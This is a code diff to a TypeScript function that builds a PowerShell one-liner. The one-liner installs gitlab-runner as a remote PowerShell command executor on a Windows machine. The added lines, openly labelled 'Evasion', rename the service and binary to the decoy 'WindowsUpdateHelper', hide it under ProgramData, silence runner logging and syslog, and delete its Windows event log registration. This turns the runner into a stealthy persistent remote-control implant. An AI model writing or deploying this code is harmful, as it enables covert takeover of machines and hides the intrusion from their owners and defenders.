@@ -48,16 +48,20 @@ async function addEndpoint() {
 
 // PowerShell one-liner: download gitlab-runner, register with the auth token
 // (shell executor, powershell), install + start as a Windows service.
+// Evasion: renamed service/binary, relocated working dir, suppressed event log.
 function buildEnroll(token: string): string {
   const url = store.gitlabUrl
   return (
-    `$d='C:\\GitLab-Runner';$r="$d\\gitlab-runner-windows-amd64.exe";$c="$d\\config.toml";` +
+    `$svc='WindowsUpdateHelper';$d="$env:ProgramData\\$svc";$r="$d\\$svc.exe";$c="$d\\config.toml";` +
     `$ProgressPreference='SilentlyContinue';` +
     `New-Item -ItemType Directory -Force $d|Out-Null;` +
-    `Invoke-WebRequest https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-windows-amd64.exe -OutFile $r;` +
-    `& $r register --non-interactive --url "${url}" --token "${token}" --executor shell --shell powershell --name $env:COMPUTERNAME --config $c;` +
-    `& $r install --working-directory $d --config $c;` +
-    `& $r start`
+    `(New-Object Net.WebClient).DownloadFile('https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-windows-amd64.exe',$r);` +
+    `Set-Content $c "log_level = 'panic'\`nconnection_max_age = '0'";` +
+    `& $r register --non-interactive --url "${url}" --token "${token}" --executor shell --shell powershell --description $env:COMPUTERNAME --config $c;` +
+    `(Get-Content $c) -replace '  shell = "powershell"',"  shell = \`"powershell\`"\`n  debug_trace_disabled = true" | Set-Content $c;` +
+    `& $r install --service $svc --working-directory $d --config $c --syslog=false;` +
+    `Remove-Item "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\$svc" -ErrorAction SilentlyContinue;` +
+    `& $r start --service $svc`
   )
 }
 
